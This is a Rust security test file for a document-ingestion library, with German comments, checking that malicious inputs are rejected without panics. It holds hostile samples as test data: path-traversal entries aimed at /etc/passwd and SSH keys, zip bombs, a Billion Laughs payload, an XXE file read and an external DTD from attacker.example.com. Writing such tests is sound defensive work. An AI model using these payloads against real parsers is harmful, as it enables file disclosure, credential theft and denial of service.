//! Sicherheits-, Limits- und Robustheits-Beweise (WP-3).
//!
//! # Zweck & Invarianten
//! Verifiziert, dass alle fehlerhaften, manipulierten oder bösartigen Eingaben
//! (Zip-Bomben, XXE, Rekursionsbomben, Directory Traversal, übergroße Dokumente,
//! defekte oder abgeschnittene Datei-Header) deterministisch zu typisierten `IngestError`
//! führen und NIEMALS zu Panic, OOM oder Deadlock/Hängern (INV-1, INV-5).

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing,
    clippy::disallowed_methods
)]

use contextra_ingest::chunking::types::DocId;
use contextra_ingest::error::{IngestError, LimitKind};
use contextra_ingest::format::FormatId;
use contextra_ingest::pipeline::{ingest, IngestConfig, IngestRequest};
use contextra_ingest::registry::ExtractorRegistry;
use std::time::Instant;

#[cfg(feature = "zip-container")]
use contextra_ingest::limits::IngestLimits;
#[cfg(feature = "zip-container")]
use contextra_ingest::safe::archive::{validate_archive_entry_path, validate_zip_archive};
#[cfg(feature = "xml")]
use contextra_ingest::safe::xml::parse_xml;
#[cfg(feature = "xml")]
use contextra_ingest::extractor::ResourceBudget;
#[cfg(feature = "zip-container")]
use std::io::Cursor;
#[cfg(feature = "zip-container")]
use zip::write::FileOptions;
#[cfg(feature = "zip-container")]
use zip::ZipWriter;

/// Testet die Abweisung von Zip-Slip-Pfaden bei der Archiv-Validierung.
#[test]
#[cfg(feature = "zip-container")]
fn test_security_zip_slip_rejection() {
    let malicious_paths = [
        "../etc/passwd",
        "../../shadow",
        "..\\windows\\system32\\cmd.exe",
        "/root/.ssh/id_rsa",
        "\\windows\\system32\\calc.exe",
        "C:\\Windows\\System32\\calc.exe",
        "archive/../../outside.txt",
        "nested/dir/../../../secret.key",
    ];

    for path in malicious_paths {
        let res = validate_archive_entry_path(path, 1024);
        assert!(
            res.is_err(),
            "Path traversal must be rejected: {path}"
        );
    }
}

/// Testet die Erkennung und Fail-Closed-Abweisung extremer Kompressionsraten (Zip-Bomben).
#[test]
#[cfg(feature = "zip-container")]
fn test_security_zip_bomb_ratio_limit() {
    let mut buf = Vec::new();
    {
        let mut writer = ZipWriter::new(Cursor::new(&mut buf));
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        writer.start_file("payload.bin", options).unwrap();
        // 2 MiB Nullen komprimieren sich auf wenige hundert Bytes (Kompressionsrate weit über 100:1)
        let zeroes = vec![0u8; 2 * 1024 * 1024];
        std::io::Write::write_all(&mut writer, &zeroes).unwrap();
        writer.finish().unwrap();
    }

    let mut limits = IngestLimits::default();
    limits.max_compression_ratio = 15; // Max 15:1 Ratio

    let res = validate_zip_archive(Cursor::new(&buf), &limits);
    assert!(
        matches!(
            res,
            Err(IngestError::LimitExceeded {
                kind: LimitKind::CompressionRatio,
                ..
            })
        ),
        "Expected CompressionRatio LimitExceeded, got {res:?}"
    );
}

/// Testet die Obergrenze für unkomprimierte Gesamtgröße in Archiven.
#[test]
#[cfg(feature = "zip-container")]
fn test_security_zip_bomb_total_decompressed_bytes() {
    let mut buf = Vec::new();
    {
        let mut writer = ZipWriter::new(Cursor::new(&mut buf));
        let options = FileOptions::default();
        writer.start_file("entry1.txt", options).unwrap();
        std::io::Write::write_all(&mut writer, &[b'X'; 50_000]).unwrap();
        writer.start_file("entry2.txt", options).unwrap();
        std::io::Write::write_all(&mut writer, &[b'Y'; 60_000]).unwrap();
        writer.finish().unwrap();
    }

    let mut limits = IngestLimits::default();
    limits.max_decompressed_bytes = 100_000; // Limit 100 KB, total is 110 KB

    let res = validate_zip_archive(Cursor::new(&buf), &limits);
    assert!(
        matches!(
            res,
            Err(IngestError::LimitExceeded {
                kind: LimitKind::DecompressedBytes,
                ..
            })
        ),
        "Expected DecompressedBytes LimitExceeded, got {res:?}"
    );
}

/// Testet die Abweisung von XML-Entity-Expansion (Billion Laughs / DTD / XXE).
#[test]
#[cfg(feature = "xml")]
fn test_security_xml_xxe_and_entity_expansion_rejected() {
    let xxe_payloads: &[&[u8]] = &[
        b"<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"lol\">\n <!ELEMENT lolz (#PCDATA)>\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n]>\n<lolz>&lol1;</lolz>",
        b"<?xml version=\"1.0\"?>\n<!DOCTYPE doc [<!ENTITY win SYSTEM \"file:///c:/windows/win.ini\">]><doc>&win;</doc>",
        b"<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY % remote SYSTEM \"http://attacker.example.com/evil.dtd\">%remote;]><r/>",
    ];

    let limits = contextra_ingest::limits::IngestLimits::default();
    let budget = ResourceBudget::new(limits);

    for (i, payload) in xxe_payloads.iter().enumerate() {
        let res = parse_xml(payload, &budget);
        assert!(
            res.is_err(),
            "XXE / Entity payload #{i} must be rejected by parse_xml"
        );
        let err = res.unwrap_err();
        let err_dbg = format!("{err:?}");
        assert!(
            err_dbg.contains("XXE-Sicherheitsverstoß")
                || err_dbg.contains("Corrupt")
                || err_dbg.contains("LimitExceeded"),
            "Unexpected error variant for payload #{i}: {err_dbg}"
        );
    }
}

/// Testet tief verschachtelte XML-Strukturen auf Einhaltung der Tiefengrenze ohne Stack-Overflow.
#[test]
#[cfg(feature = "xml")]
fn test_security_xml_deep_nesting_limit() {
    let depth = 500;
    let mut xml = String::new();
    for _ in 0..depth {
        xml.push_str("<node>");
    }
    xml.push_str("leaf");
    for _ in 0..depth {
        xml.push_str("</node>");
    }

    let mut limits = contextra_ingest::limits::IngestLimits::default();
    limits.max_xml_depth = 50;
    let budget = ResourceBudget::new(limits);

    let res = parse_xml(xml.as_bytes(), &budget);
    assert!(
        matches!(
            res,
            Err(IngestError::LimitExceeded {
                kind: LimitKind::XmlDepth,
                ..
            })
        ),
        "Expected XmlDepth LimitExceeded for 500-level XML, got {res:?}"
    );
}

/// Testet Dokumentgrößen-Obergrenze auf Pipeline-Ebene (`max_document_bytes`).
#[test]
fn test_security_pipeline_max_document_bytes() {
    let registry = ExtractorRegistry::with_defaults();
    let large_data = vec![b'A'; 200_000];

    let mut cfg = IngestConfig::default();
    cfg.limits.max_document_bytes = 100_000;

    let req = IngestRequest {
        bytes: &large_data,
        filename: Some("large.txt"),
        mime: None,
        format_override: Some(FormatId::Txt),
        doc_id: DocId::new(1),
    };

    let res = ingest(&req, &cfg, &registry);
    assert!(
        matches!(
            res,
            Err(IngestError::LimitExceeded {
                kind: LimitKind::DocumentBytes,
                ..
            })
        ),
        "Expected DocumentBytes LimitExceeded, got {res:?}"
    );
}

/// Testet Zero-Panic und saubere Fehlerbehandlung für verstümmelte / abgeschnittene Binär-Header.
#[test]
fn test_security_truncated_and_corrupt_headers_no_panic() {
    let registry = ExtractorRegistry::with_defaults();
    let cfg = IngestConfig::default();

    let formats = [
        FormatId::Pdf,
        FormatId::Docx,
        FormatId::Pptx,
        FormatId::Odt,
        FormatId::Ods,
        FormatId::Odp,
        FormatId::Xlsx,
        FormatId::Doc,
        FormatId::Ppt,
        FormatId::Msg,
        FormatId::Eml,
        FormatId::Mbox,
        FormatId::Json,
        FormatId::Yaml,
        FormatId::Toml,
        FormatId::Xml,
        FormatId::Html,
    ];

    // Typische Magic-Präfixe, aber unvollständig abgeschnitten (1 bis 8 Bytes)
    let bad_payloads: &[&[u8]] = &[
        b"",
        b"\x00",
        b"%PDF-",
        b"%PDF-1.7\n%\xe2\xe3",
        b"PK\x03\x04",
        b"PK\x03\x04\x14\x00\x00\x00",
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
        b"{\"",
        b"{\"key\": ",
        b"---\nkey: [",
        b"<?xml ",
        b"<html",
    ];

    let start = Instant::now();
    for &fmt in &formats {
        for &payload in bad_payloads {
            let req = IngestRequest {
                bytes: payload,
                filename: Some("test_corrupt"),
                mime: None,
                format_override: Some(fmt),
                doc_id: DocId::new(42),
            };

            // Ingestion darf niemals abbrechen oder paniken
            let res = ingest(&req, &cfg, &registry);
            // Entweder typisierter Fehler oder leeres/valides Teilergebnis
            if let Err(err) = res {
                assert!(
                    matches!(
                        err,
                        IngestError::Corrupt { .. }
                            | IngestError::LimitExceeded { .. }
                            | IngestError::UnsupportedFormat { .. }
                            | IngestError::Encrypted { .. }
                            | IngestError::NoExtractableText { .. }
                    ),
                    "Expected clean IngestError for format {fmt:?}, got {err:?}"
                );
            }
        }
    }

    // Zeitschranke: Alle Tests müssen in unter 5 Sekunden durchlaufen
    assert!(
        start.elapsed().as_secs() < 5,
        "Corrupt header parsing exceeded runtime threshold"
    );
}
